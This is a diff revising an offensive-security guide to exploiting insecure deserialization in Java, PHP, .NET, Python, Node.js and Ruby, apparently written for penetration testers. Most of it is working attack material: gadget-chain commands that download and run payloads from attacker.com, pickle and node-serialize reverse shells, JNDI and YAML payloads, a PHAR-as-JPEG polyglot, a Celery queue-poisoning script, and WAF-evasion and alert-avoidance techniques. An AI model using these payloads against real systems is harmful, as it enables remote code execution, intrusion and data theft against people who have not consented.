@@ -6,70 +6,55 @@ description: "Insecure deserialization exploitation across Java, PHP, .NET, Pyth
 # Offensive Deserialization
 
 Deserialization vulnerabilities arise when an application reconstructs objects from
-serialized byte streams without validating the type, integrity, or origin of those
-bytes. Because object reconstruction can trigger constructors, finalizers, and
-language-specific magic methods, an attacker who controls the serialized input often
-achieves remote code execution before any application-level validation runs. This
-skill provides a structured methodology for discovering deserialization sinks,
-selecting or building gadget chains, delivering payloads through common and
-overlooked channels, and evading defensive controls.
+serialized byte streams without validating the type, integrity, or origin of the
+data. Object reconstruction triggers constructors, finalizers, and language-specific
+magic methods, so an attacker who controls the serialized input often achieves remote
+code execution before any application-level validation runs.
 
 ## Quick Workflow
-
-1. Enumerate every entry point that accepts opaque binary or encoded data -- cookies,
+1. Enumerate every entry point accepting opaque binary or encoded data -- cookies,
    HTTP bodies, headers, message queue messages, file uploads, GraphQL custom scalars,
    gRPC fields, JMX/RMI endpoints.
-2. Fingerprint the serialization format by inspecting magic bytes, content-type
-   headers, and error behavior (see the Recognition Signatures section).
-3. Determine the server-side language and framework version. Pull dependency lists
-   from error pages, HTTP headers, or source code if available.
-4. Select candidate gadget chains that match the target's classpath or installed
-   packages. Generate payloads with ysoserial, phpggc, ysoserial.net, or manual
-   pickle/YAML construction.
-5. Deliver the payload through the identified entry point. Start with a DNS-only or
-   sleep-based proof to confirm execution without destructive side effects.
-6. Escalate from proof-of-concept to the engagement objective (reverse shell, file
-   read, credential extraction) with the client's authorization.
-7. Document the full chain: entry point, serialization format, gadget chain, library
-   versions, and proof artifact.
+2. Fingerprint the serialization format via magic bytes, content-type headers, and
+   error behavior (see Recognition Signatures).
+3. Determine the server-side language and framework version from error pages, HTTP
+   headers, or source code.
+4. Select candidate gadget chains matching the target classpath or installed packages.
+   Generate payloads with ysoserial, phpggc, ysoserial.net, or manual construction.
+5. Deliver through the identified entry point. Start with DNS-only or sleep-based
+   proof to confirm execution without destructive side effects.
+6. Escalate from proof-of-concept to the engagement objective with authorization.
+7. Document the full chain: entry point, format, gadget chain, library versions, proof.
 
 ---
-
 ## Recognition Signatures
-
-Use these byte patterns and string prefixes to identify serialization formats in
-intercepted traffic.
 
 | Format | Signature | Notes |
 |---|---|---|
-| Java ObjectInputStream | Hex `ac ed 00 05`, Base64 `rO0AB` | Often in cookies, POST bodies, JMX/RMI streams |
+| Java ObjectInputStream | Hex `ac ed 00 05`, Base64 `rO0AB` | Cookies, POST bodies, JMX/RMI streams |
 | PHP serialize | `O:<len>:"ClassName":` or `a:<count>:{` | Frequently Base64-wrapped in cookies |
 | .NET BinaryFormatter | Base64 `AAEAAAD/////` | ViewState, remoting, session state |
-| Python pickle | Opcodes `\x80\x04\x95` (protocol 4+), older `(dp0` text mode | Found in Redis caches, Celery tasks, ML pipelines |
+| Python pickle | Opcodes `\x80\x04\x95` (v4+), older `(dp0` text | Redis caches, Celery tasks, ML pipelines |
 | Ruby Marshal | `\x04\x08` leading bytes | Session cookies in older Rails apps |
-| YAML (any language) | `--- !ruby/object:` or `!!python/object/apply:` | Tag-based instantiation |
+| YAML (any lang) | `--- !ruby/object:` or `!!python/object/apply:` | Tag-based instantiation |
 | Java XMLDecoder | `<?xml` with `<java>` or `<object class=` | Legacy Java admin panels |
 | .NET Json.NET | `"$type":` key in JSON | TypeNameHandling != None |
-| Java Jackson | `["class.name", {` JSON array wrapper | enableDefaultTyping / polymorphic type handling |
+| Java Jackson | `["class.name", {` JSON array wrapper | enableDefaultTyping / polymorphic handling |
 
 ---
-
 ## Java Deserialization
 
-Java deserialization is the most extensively researched attack surface. The
-`ObjectInputStream.readObject()` method instantiates arbitrary classes present on the
-classpath, and decades of library code provide usable gadget chains.
+`ObjectInputStream.readObject()` instantiates arbitrary classes present on the
+classpath. Decades of library code provide usable gadget chains.
 
 ### Identifying Sinks
-
-Search source code or decompiled JARs for these patterns:
 
 ```java
 // Direct ObjectInputStream usage
 ObjectInputStream ois = new ObjectInputStream(inputStream);
 Object obj = ois.readObject();
 
-// XMLDecoder (equally dangerous, often overlooked)
+// XMLDecoder -- equally dangerous, often overlooked
 XMLDecoder decoder = new XMLDecoder(inputStream);
 Object obj = decoder.readObject();
 
@@ -77,197 +62,154 @@ Object obj = decoder.readObject();
 XStream xstream = new XStream();
 Object obj = xstream.fromXML(userInput);
 
-// Jackson with polymorphic typing enabled
+// Jackson polymorphic typing -- CVE-2017-7525 and successors
 ObjectMapper mapper = new ObjectMapper();
-mapper.enableDefaultTyping();  // CVE-2017-7525 and successors
+mapper.enableDefaultTyping();
 
 // Jackson @JsonTypeInfo on base class
 @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)
 public abstract class BaseCommand { }
 
-// JMX/RMI endpoints accepting serialized objects
-// Default JMX port 1099, often unauthenticated
+// JMX/RMI endpoints -- default port 1099, often unauthenticated
 ```
 
 ### serialVersionUID and Classpath Constraints
 
-Every serializable Java class carries a `serialVersionUID`. A mismatch between the
-payload's UID and the server's class version causes an `InvalidClassException` before
-any gadget logic executes. When you encounter this:
-
-1. Extract the server's `serialVersionUID` from error messages or decompiled JARs.
-2. Rebuild the payload with the matching UID using ysoserial's source or a custom
-   build.
-3. If the exact library version is unknown, brute-force common versions. The UID
-   often changes only on major releases.
+Every serializable Java class carries a `serialVersionUID`. A mismatch causes
+`InvalidClassException` before any gadget logic executes. Extract the server's UID
+from error messages or decompiled JARs, then rebuild the payload with ysoserial's
+source. The UID often changes only on major releases, so brute-forcing common
+versions is feasible when the exact version is unknown.
 
 ### ysoserial Gadget Chains
 
-Generate payloads with ysoserial. Match the chain to libraries present on the target
-classpath.
+Match the chain to libraries present on the target classpath.
 
 ```bash
-# CommonsCollections chains -- most widely applicable
-# CC1 requires commons-collections 3.1, works on JDK < 8u72
-java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/callback' > payload.bin
-
-# CC5 works on later JDK versions where CC1 is patched
-java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/callback' > payload.bin
-
-# CC7 uses Hashtable entry point, bypasses some ObjectInputFilter rules
+# CommonsCollections -- most widely applicable
+# CC1: commons-collections 3.1, JDK < 8u72
+java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/cb' > payload.bin
+# CC5: later JDK versions where CC1 is patched
+java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/cb' > payload.bin
+# CC7: Hashtable entry point, bypasses some ObjectInputFilter rules
 java -jar ysoserial.jar CommonsCollections7 'id > /tmp/proof.txt' > payload.bin
 
-# Spring chain -- requires spring-core + spring-beans on classpath
-java -jar ysoserial.jar Spring1 'wget http://attacker.com/shell.sh -O /tmp/s.sh' > payload.bin
-
+# Spring chain -- requires spring-core + spring-beans
+java -jar ysoserial.jar Spring1 'wget http://attacker.com/s.sh -O /tmp/s.sh' > payload.bin
 # Hibernate chain -- requires hibernate-core
-java -jar ysoserial.jar Hibernate1 'bash -c {echo,BASE64PAYLOAD}|{base64,-d}|bash' > payload.bin
-
-# CommonsBeanutils -- present in many enterprise apps via shaded dependencies
+java -jar ysoserial.jar Hibernate1 'bash -c {echo,BASE64}|{base64,-d}|bash' > payload.bin
+# CommonsBeanutils -- present in many apps via shaded dependencies
 java -jar ysoserial.jar CommonsBeanutils1 'ping -c 3 attacker.com' > payload.bin
 
-# URLDNS chain -- triggers a DNS lookup, no RCE, safe for detection confirmation
+# URLDNS -- DNS lookup only, no RCE, safe for detection confirmation
 java -jar ysoserial.jar URLDNS 'http://deser-confirm.attacker.com' > payload.bin
 
-# JRMPClient -- redirects deserialization to attacker-controlled JRMP listener
+# JRMPClient -- redirect deser to attacker-controlled JRMP listener
 java -jar ysoserial.jar JRMPClient 'attacker.com:1099' > payload.bin
-
-# On attacker host, run the JRMP listener to serve a secondary payload
+# On attacker host, serve secondary payload via JRMP listener
 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'id'
 ```
 
 ### JMX/RMI Deserialization
 
-Java Management Extensions (JMX) and RMI registries accept serialized objects over
-the wire. They are frequently exposed on internal networks without authentication.
+JMX and RMI registries accept serialized objects over the wire and are frequently
+exposed without authentication on internal networks.
 
 ```bash
 # Scan for RMI registries
 nmap -sV -p 1099,1098,9010,9011 --script rmi-dumpregistry TARGET
 
-# Use marshalsec to exploit RMI/JNDI
+# marshalsec: exploit RMI/JNDI
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \
   "http://attacker.com:8080/#ExploitClass" 1099
-
-# Exploit JNDI injection via deserialization
-# Payload triggers lookup to attacker-controlled naming service
-java -jar ysoserial.jar JRMPClient 'attacker.com:1099' | \
-  base64 -w0 > jmx_payload.b64
 ```
 
 ### Jackson Polymorphic Typing
 
-When Jackson's `enableDefaultTyping()` or `@JsonTypeInfo(use = Id.CLASS)` is active,
-you supply a JSON array where the first element names the class to instantiate.
+When `enableDefaultTyping()` or `@JsonTypeInfo(use = Id.CLASS)` is active, you
+supply a JSON array naming the class to instantiate.
 
 ```json
 ["com.sun.rowset.JdbcRowSetImpl",
- {"dataSourceName":"ldap://attacker.com:1389/Exploit",
-  "autoCommit":true}]
+ {"dataSourceName":"ldap://attacker.com:1389/Exploit","autoCommit":true}]
 ```
 
 Jackson maintainers continuously add classes to a denylist. Check the target's
-Jackson version against known bypass classes. Recent bypasses have used
-`org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`,
+version against known bypass classes: `org.apache.ibatis.datasource.jndi.JndiDataSourceFactory`,
 `com.caucho.config.types.ResourceRef`, and similar JNDI-capable beans.
 
 ---
-
 ## PHP Deserialization
 
-PHP's `unserialize()` function instantiates objects and invokes magic methods
-(`__wakeup`, `__destruct`, `__toString`) during reconstruction. The `phar://` stream
-wrapper triggers deserialization without an explicit `unserialize()` call.
+`unserialize()` instantiates objects and invokes magic methods (`__wakeup`,
+`__destruct`, `__toString`) during reconstruction. The `phar://` stream wrapper
+triggers deserialization without an explicit `unserialize()` call.
 
 ### Identifying Sinks
 
 ```php
-// Direct unserialize -- classic vector
+// Direct unserialize
 $obj = unserialize($userInput);
 
-// phar:// wrapper triggers deserialization on metadata
-// Any file operation that accepts a phar:// path is a sink
+// phar:// wrapper -- any file operation on a phar:// path is a sink
 file_exists("phar://uploads/avatar.jpg");
-file_get_contents("phar://user_data/config.phar");
 is_dir("phar://" . $userControlledPath);
-
-// Functions that trigger phar deserialization:
-// file_exists, is_dir, is_file, file_get_contents, fopen, fileatime,
-// filectime, filemtime, filesize, copy, rename, unlink, stat, lstat,
-// getimagesize, exif_read_data, hash_file, md5_file, sha1_file
+// Triggering functions: file_exists, is_dir, is_file, file_get_contents,
+// fopen, fileatime, filectime, filemtime, filesize, copy, rename, unlink,
+// stat, lstat, getimagesize, exif_read_data, hash_file, md5_file, sha1_file
 ```
 
 ### phpggc Gadget Chains
 
-phpggc generates gadget chain payloads for common PHP frameworks.
-
 ```bash
-# List all available chains
-phpggc -l
+phpggc -l  # List all available chains
 
-# Laravel RCE -- uses PendingBroadcast + Dispatcher
-# Works on Laravel 5.5 through 9.x depending on chain variant
-phpggc Laravel/RCE1 system 'id' -b  # -b for base64 output
+# Laravel RCE -- PendingBroadcast + Dispatcher, works 5.5 through 9.x
+phpggc Laravel/RCE1 system 'id' -b        # -b = base64
+phpggc Laravel/RCE10 system 'cat /etc/passwd' -s  # -s = serialized
 
-# Laravel/RCE10 -- newer chain for recent versions
-phpggc Laravel/RCE10 system 'cat /etc/passwd' -s  # -s for serialized output
-
-# Symfony RCE -- targets Symfony's process component
-phpggc Symfony/RCE4 exec 'curl http://attacker.com/shell.sh|bash' -b
-
-# Monolog RCE -- present in most Composer-based projects
+# Symfony RCE -- targets process component
+phpggc Symfony/RCE4 exec 'curl http://attacker.com/s.sh|bash' -b
+# Monolog RCE -- present in most Composer projects
 phpggc Monolog/RCE1 system 'whoami' -b
-
-# Guzzle chain
+# Guzzle / WordPress chains
 phpggc Guzzle/RCE1 system 'id' -b
-
-# WordPress-specific (if WP plugins load vulnerable classes)
 phpggc WordPress/RCE1 system 'id' -b
 
-# Generate a phar file instead of raw serialized data
+# PHAR output instead of raw serialized data
 phpggc Laravel/RCE1 system 'id' -p phar -o exploit.phar
-
-# Generate with PHAR polyglot disguised as JPEG
+# PHAR polyglot disguised as JPEG
 phpggc Laravel/RCE1 system 'id' -p phar -pp header.jpg -o exploit.jpg
 ```
 
 ### phar:// Exploitation
 
-The phar:// wrapper deserializes the metadata section of a PHAR archive when any
-file operation accesses it. This is powerful because the sink is a file function, not
-an explicit `unserialize()` call, so it evades many code audits.
+The phar:// wrapper deserializes the metadata section of a PHAR archive on any file
+operation. The sink is a file function, not `unserialize()`, so it evades many audits.
 
 ```php
-// Build a malicious PHAR (attacker side)
-// php.ini must have phar.readonly = 0
+// Build a malicious PHAR (php.ini: phar.readonly = 0)
 $phar = new Phar('exploit.phar');
 $phar->startBuffering();
 $phar->addFromString('test.txt', 'test');
-
-// Set the metadata to your gadget chain object
 $object = new VulnerableClass();
 $object->command = 'id';
 $phar->setMetadata($object);
-
 $phar->stopBuffering();
 
-// Prepend a JPEG header to create a polyglot
+// Create a polyglot by prepending a JPEG header
 $jpegHeader = file_get_contents('legitimate.jpg');
-$pharContent = file_get_contents('exploit.phar');
-file_put_contents('exploit.jpg', $jpegHeader . $pharContent);
+file_put_contents('exploit.jpg', $jpegHeader . file_get_contents('exploit.phar'));
 ```
 
-Upload the polyglot as an image, then trigger a file operation that references
-`phar://uploads/exploit.jpg/test.txt`. The metadata deserializes before the file
-operation completes.
+Upload the polyglot as an image, then trigger a file operation referencing
+`phar://uploads/exploit.jpg/test.txt`.
 
 ---
-
 ## .NET Deserialization
 
-.NET offers multiple serialization mechanisms. `BinaryFormatter` is the most
-dangerous and Microsoft has formally deprecated it, but legacy applications and
-internal tools still rely on it.
+`BinaryFormatter` is the most dangerous .NET serializer. Microsoft has formally
+deprecated it, but legacy applications and internal tools still use it.
 
 ### Identifying Sinks
 
@@ -276,13 +218,9 @@ internal tools still rely on it.
 BinaryFormatter formatter = new BinaryFormatter();
 object obj = formatter.Deserialize(stream);
 
-// SoapFormatter -- equally dangerous, less common
+// SoapFormatter / NetDataContractSerializer -- equally dangerous
 SoapFormatter soap = new SoapFormatter();
-object obj = soap.Deserialize(stream);
-
-// NetDataContractSerializer -- type information in the stream
 NetDataContractSerializer ndcs = new NetDataContractSerializer();
-object obj = ndcs.ReadObject(stream);
 
 // LosFormatter -- used in ViewState
 LosFormatter los = new LosFormatter();
@@ -297,41 +235,30 @@ JsonConvert.DeserializeObject<object>(json, new JsonSerializerSettings {
 ### ysoserial.net Payloads
 
 ```powershell
-# TypeConfuseDelegate -- works broadly across .NET versions
+# TypeConfuseDelegate -- broad .NET coverage
 ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "ping attacker.com"
-
-# WindowsIdentity -- useful when TypeConfuseDelegate is blocked
-ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe"
-
-# TextFormattingRunProperties -- targets WPF/XAML parsing
+# WindowsIdentity -- when TypeConfuseDelegate is blocked
+ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "certutil -urlcache -split -f http://attacker.com/s.exe C:\Temp\s.exe"
+# TextFormattingRunProperties -- targets WPF/XAML
 ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "calc.exe"
-
-# PSObject -- PowerShell-specific chain
+# PSObject -- PowerShell-specific
 ysoserial.exe -g PSObject -f BinaryFormatter -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
-
-# Generate for Json.NET TypeNameHandling
-ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd.exe /c whoami > C:\proof.txt"
-
-# Output as base64 for injection into ViewState or cookies
+# Json.NET TypeNameHandling
+ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c whoami > C:\proof.txt"
+# Base64 output for ViewState or cookie injection
 ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping attacker.com" -o base64
 ```
 
 ### ViewState Exploitation
 
-ASP.NET ViewState is a serialized blob stored in a hidden form field. When MAC
-validation is disabled or the machine key is known, you can inject a gadget chain
-directly.
+ASP.NET ViewState is a serialized hidden form field. When MAC validation is disabled
+or the machine key is known, you inject a gadget chain directly.
 
 ```bash
-# Check if ViewState MAC is disabled (rare but found in legacy apps)
-# Look for enableViewStateMac="false" in web.config
-# or __VIEWSTATEGENERATOR values that suggest no MAC
-
-# If machine key is known (e.g., from web.config disclosure, default keys,
-# or HackTheBox-style challenges), generate a ViewState payload:
+# If machine key is known (web.config disclosure, default keys):
 ysoserial.exe -p ViewState \
   -g TextFormattingRunProperties \
-  -c "powershell -enc BASE64COMMAND" \
+  -c "powershell -enc BASE64CMD" \
   --validationalg="SHA1" \
   --validationkey="KNOWN_KEY" \
   --generator="GENERATOR_VALUE" \
@@ -341,8 +268,7 @@ ysoserial.exe -p ViewState \
 
 ### Json.NET TypeNameHandling
 
-When `TypeNameHandling` is set to anything other than `None`, the `$type` property
-in JSON controls which .NET type is instantiated.
+When `TypeNameHandling` is not `None`, the `$type` property controls instantiation.
 
 ```json
 {
@@ -352,63 +278,46 @@ in JSON controls which .NET type is instantiated.
     "$type": "System.Collections.ArrayList, mscorlib",
     "$values": ["cmd.exe", "/c whoami"]
   },
-  "ObjectInstance": {
-    "$type": "System.Diagnostics.Process, System"
-  }
+  "ObjectInstance": {"$type": "System.Diagnostics.Process, System"}
 }
 ```
 
 ---
-
 ## Python Deserialization
 
-Python's `pickle` module executes arbitrary code during deserialization through the
+Python's `pickle` executes arbitrary code during deserialization through the
 `__reduce__` method. There is no safe way to deserialize untrusted pickle data.
 
 ### pickle RCE
 
 ```python
-import pickle
-import os
-import base64
+import pickle, os, base64
 
-# Basic __reduce__ RCE payload
 class Exploit:
     def __reduce__(self):
         return (os.system, ('curl http://attacker.com/callback',))
 
-# Generate the payload
 payload = pickle.dumps(Exploit())
 print(base64.b64encode(payload).decode())
 
-# More sophisticated: use subprocess for output capture
-class ExfilExploit:
-    def __reduce__(self):
-        return (
-            __import__('subprocess').check_output,
-            (['cat', '/etc/passwd'],)
-        )
-
-# Reverse shell via pickle
+# Reverse shell variant
 class ReverseShell:
     def __reduce__(self):
-        return (
-            os.system,
-            ('python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',)
-        )
+        return (os.system, (
+            'python3 -c \'import socket,subprocess,os;'
+            's=socket.socket();s.connect(("attacker.com",4444));'
+            'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);'
+            'os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',))
 
-# Chained execution for multi-step payloads
+# Chained multi-step payload
 class ChainedExploit:
     def __reduce__(self):
-        return (eval, (
-            "__import__('os').system('wget http://attacker.com/implant -O /tmp/i && chmod +x /tmp/i && /tmp/i')",
-        ))
+        return (eval, ("__import__('os').system('wget http://attacker.com/i -O /tmp/i && chmod +x /tmp/i && /tmp/i')",))
 ```
 
 ### yaml.load RCE
 
-Python's `yaml.load()` without a safe loader permits arbitrary object instantiation
-through YAML tags.
+`yaml.load()` without a safe loader permits arbitrary object instantiation.
 
 ```yaml
 # Direct command execution
@@ -418,94 +327,60 @@ through YAML tags.
 # Subprocess with output
 !!python/object/apply:subprocess.check_output
 - ["id"]
-
-# Module import and execute
-!!python/object/new:type
-args:
-  - exploit
-  - !!python/tuple []
-  - {"__reduce__": !!python/name:os.system}
 ```
 
 ```bash
-# Test for unsafe yaml.load -- this is common in config parsers,
-# ML model loading, and data pipeline configurations
-# Look for yaml.load() without Loader=yaml.SafeLoader
+# Find unsafe yaml.load in codebase
 grep -rn "yaml\.load\s*(" --include="*.py" /path/to/codebase
 ```
 
 ### Other Python Vectors
 
 ```python
-# shelve module -- uses pickle internally
-import shelve
-db = shelve.open('data.db')  # If attacker controls the .db file, RCE on open
-
-# marshal module -- lower-level than pickle, still dangerous
-import marshal
-code = marshal.loads(attacker_controlled_bytes)  # Code object injection
-
-# jsonpickle -- third-party lib, same risks as pickle
-import jsonpickle
-obj = jsonpickle.decode(attacker_json)  # Arbitrary object instantiation
+import shelve   # Uses pickle internally -- RCE on shelve.open() of attacker-controlled .db
+import marshal  # Code object injection via marshal.loads()
+import jsonpickle  # Third-party, same risks as pickle via jsonpickle.decode()
 ```
 
 ---
-
 ## Node.js Deserialization
-
-Node.js deserialization vulnerabilities typically involve libraries that reconstruct
-functions from serialized strings and execute them.
 
 ### node-serialize IIFE Pattern
 
-The `node-serialize` library uses a `_$$ND_FUNC$$_` marker to denote serialized
-functions. Appending `()` creates an Immediately Invoked Function Expression that
-executes during deserialization.
+The `node-serialize` library uses `_$$ND_FUNC$$_` to mark serialized functions.
+Appending `()` creates an IIFE that executes during deserialization.
 
 ```javascript
-// Malicious serialized object -- the trailing () causes immediate execution
-{"username":"admin","role":"_$$ND_FUNC$$_function(){require('child_process').execSync('curl http://attacker.com/callback')}()"}
+// Trailing () causes immediate execution
+{"role":"_$$ND_FUNC$$_function(){require('child_process').execSync('curl http://attacker.com/cb')}()"}
 
-// Reverse shell payload
-{"rce":"_$$ND_FUNC$$_function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect(4444,'attacker.com',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);})}()"}
+// Reverse shell
+{"rce":"_$$ND_FUNC$$_function(){var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(4444,'attacker.com',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);})}()"}
 
-// Base64 encoded to avoid character issues in transit
-{"payload":"_$$ND_FUNC$$_function(){eval(Buffer.from('BASE64ENCODEDPAYLOAD','base64').toString())}()"}
+// Base64-wrapped to avoid character issues
+{"p":"_$$ND_FUNC$$_function(){eval(Buffer.from('BASE64PAYLOAD','base64').toString())}()"}
 ```
 
 ### funcster
 
-The `funcster` library serializes and deserializes JavaScript functions. Any
-application that deserializes user-controlled funcster data is vulnerable.
-
 ```javascript
-// funcster deserializes functions via new Function() constructor
-// Payload structure:
+// funcster deserializes via new Function() constructor
 {"__js_function": "function(){return require('child_process').execSync('id').toString()}"}
 ```
 
-### Detection in Traffic
-
-Look for these markers in cookies, session tokens, and request bodies:
-
-- `_$$ND_FUNC$$_` -- node-serialize
-- `__js_function` -- funcster
-- Serialized JavaScript function strings in Base64-encoded cookies
+Look for `_$$ND_FUNC$$_` and `__js_function` in cookies, session tokens, and request
+bodies.
 
 ---
-
 ## Ruby Deserialization
 
-Ruby's `Marshal.load` and `YAML.load` both instantiate arbitrary objects and are
-common deserialization sinks in Rails applications.
+`Marshal.load` and `YAML.load` both instantiate arbitrary objects and are common
+sinks in Rails applications.
 
 ### Marshal.load Gadgets
 
 ```ruby
-# Ruby Universal RCE gadget chain
-# Uses Gem::Installer or Gem::Requirement depending on Ruby version
-
+# Gem::Requirement chain (Ruby 2.x) / Gem::Installer (varies by version)
 # ERB template execution chain
 require 'erb'
 class Exploit
@@ -513,9 +388,6 @@ class Exploit
     @template = "<%= `id` %>"
   end
 end
-
-# Gem::Requirement chain (Ruby 2.x)
-# Serialized payload triggers command execution through Gem internals
 payload = Marshal.dump(exploit_chain)
 encoded = Base64.strict_encode64(payload)
 ```
@@ -523,11 +395,6 @@ encoded = Base64.strict_encode64(payload)
 ### YAML.load Gadgets
 
 ```yaml
-# ERB template execution via YAML
---- !ruby/object:Gem::Installer
-i: x
---- !ruby/object:Gem::SpecFetcher
-i: y
 --- !ruby/object:Gem::Requirement
 requirements:
   !ruby/object:Gem::Package::TarReader
@@ -544,22 +411,19 @@ requirements:
        method_id: :resolve
 ```
 
-Rails session cookies in older versions (before 5.2 with encrypted cookies) used
-signed but not encrypted Marshal data. With the `secret_key_base`, you can forge
-arbitrary session cookies containing gadget chains.
+Rails session cookies before 5.2 used signed but not encrypted Marshal data. With
+the `secret_key_base`, you forge session cookies containing gadget chains.
 
 ---
-
 ## Modern Attack Vectors
 
 ### Kubernetes Admission Webhooks
 
-Admission controllers deserialize `AdmissionReview` JSON objects. A validating or
-mutating webhook that passes fields from the admission request to an unsafe
-deserializer creates a cluster-level RCE vector.
+Admission controllers deserialize `AdmissionReview` JSON. A webhook that passes
+annotation or label values from the admission request to an unsafe deserializer
+creates a cluster-level RCE vector.
 
 ```yaml
-# Submit a pod with a serialized payload in an annotation
 apiVersion: v1
 kind: Pod
 metadata:
@@ -572,19 +436,16 @@ spec:
     image: nginx
 ```
 
-If the webhook's reconciliation logic deserializes the annotation value, the payload
-executes in the webhook's context, which typically has elevated cluster permissions.
+The payload executes in the webhook's context, which typically has elevated cluster
+permissions.
 
 ### Message Queue Consumers
 
-Applications consuming from Kafka, RabbitMQ, SQS, or Redis pub/sub often
-deserialize message payloads with pickle, Java ObjectInputStream, or Marshal. If you
-gain producer access to the queue, you can poison every consumer.
+Applications consuming from Kafka, RabbitMQ, SQS, or Redis often blindly
+deserialize message payloads. Producer access lets you poison every consumer.
 
 ```python
-# Poison a Redis-backed Celery task queue
-import redis
-import pickle
+import redis, pickle, os
 
 class Exploit:
     def __reduce__(self):
@@ -597,57 +458,49 @@ r.lpush('celery', pickle.dumps({
 }))
 ```
 
-### Serverless and Event-Driven Triggers
+### Serverless Triggers
 
-Serverless functions that deserialize event payloads from S3 object creation, SNS
-notifications, or SQS messages are vulnerable if the event source is attacker-
-controllable (for example, a public S3 upload endpoint).
+Serverless functions deserializing event payloads from S3, SNS, or SQS are
+vulnerable when the event source is attacker-controllable (e.g., public upload).
 
 ```python
-# AWS Lambda handler deserializing S3 object content
 def handler(event, context):
-    bucket = event['Records'][0]['s3']['bucket']['name']
-    key = event['Records'][0]['s3']['object']['key']
-    obj = s3.get_object(Bucket=bucket, Key=key)
+    obj = s3.get_object(Bucket=event['Records'][0]['s3']['bucket']['name'],
+                        Key=event['Records'][0]['s3']['object']['key'])
     data = pickle.loads(obj['Body'].read())  # RCE if attacker uploads to bucket
 ```
 
 ---
-
 ## Evasion Techniques
 
 ### WAF and Filter Bypass
 
 ```bash
-# Double Base64 encoding to bypass pattern matching
+# Double Base64 -- changes byte pattern
 cat payload.bin | base64 | base64 > double_encoded.txt
 
-# URL encoding of serialized data
-cat payload.bin | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.buffer.read()))"
-
-# Gzip compression before Base64 -- changes the byte pattern entirely
+# Gzip before Base64 -- entirely different pattern
 gzip -c payload.bin | base64 > compressed_payload.txt
 
-# Unicode escaping for JSON-based payloads
-# Replace ASCII characters with \uXXXX equivalents in $type values
+# URL encoding
+cat payload.bin | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.buffer.read()))"
 
-# Split across multiple parameters and reassemble server-side
-# Some applications concatenate parameters before deserializing
+# Unicode escaping for JSON payloads -- replace ASCII in $type with \uXXXX
+# Parameter splitting -- some apps concatenate params before deserializing
 ```
 
 ### Content-Type Manipulation
+
+Switch the delivery format to bypass format-specific WAF rules:
 
 ```http
 POST /api/endpoint HTTP/1.1
 Content-Type: application/x-java-serialized-object
 
 [binary payload]
+```
 
----
-
-POST /api/endpoint HTTP/1.1
-Content-Type: application/xml
-
+```xml
 <?xml version="1.0"?>
 <java class="java.beans.XMLDecoder">
   <object class="java.lang.Runtime" method="getRuntime">
@@ -656,96 +509,78 @@ Content-Type: application/xml
     </void>
   </object>
 </java>
-
----
-
-POST /api/endpoint HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-
-data=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH...
 ```
 
 ### Encoding Layers
 
-Many applications apply multiple encoding layers. You may need to wrap your payload
-in several layers to reach the deserializer in the expected format:
+Many applications apply multiple encoding layers. Wrap your payload to match:
 
 1. Serialize the gadget chain.
 2. Encrypt with a known or leaked key (session cookies, ViewState machine keys).
-3. Apply HMAC if integrity checks are present (requires the signing key).
-4. Base64 encode.
-5. URL encode if delivered via query parameter.
+3. Apply HMAC if integrity checks exist (requires the signing key).
+4. Base64 encode, then URL encode if delivered via query parameter.
 
-When you lack the encryption or signing key, look for:
-- Default keys in framework documentation or GitHub issues.
-- Key disclosure via path traversal, SSRF, or configuration endpoint leaks.
-- Padding oracle attacks to decrypt/encrypt without the key.
+When you lack the key, look for default keys in framework documentation, key
+disclosure via path traversal or SSRF, or padding oracle attacks to encrypt without
+the key.
 
 ---
-
 ## Detection / Defender View
 
-Understanding how defenders detect deserialization attacks helps you craft payloads
-that avoid triggering alerts.
+Understanding defensive detection helps you craft payloads that avoid alerts.
 
-**Signatures defenders watch for:**
-- Java magic bytes `ac ed 00 05` or Base64 `rO0AB` in HTTP traffic.
-- .NET `AAEAAAD/////` patterns in form fields or cookies.
-- PHP serialized object patterns `O:\d+:"` in request parameters.
-- `$type` keys in JSON request bodies (Json.NET).
-- `_$$ND_FUNC$$_` in Node.js cookies.
-- `!!python/object` tags in YAML inputs.
+**Network signatures defenders match:**
+- Java magic bytes `ac ed 00 05` / Base64 `rO0AB` in HTTP traffic
+- .NET `AAEAAAD/////` in form fields or cookies
+- PHP `O:\d+:"` in request parameters
+- `$type` keys in JSON bodies (Json.NET)
+- `_$$ND_FUNC$$_` in Node.js cookies
+- `!!python/object` tags in YAML inputs
 
 **Runtime defenses you will encounter:**
-- Java `ObjectInputFilter` (JEP 290) -- allowlists or denylists specific classes.
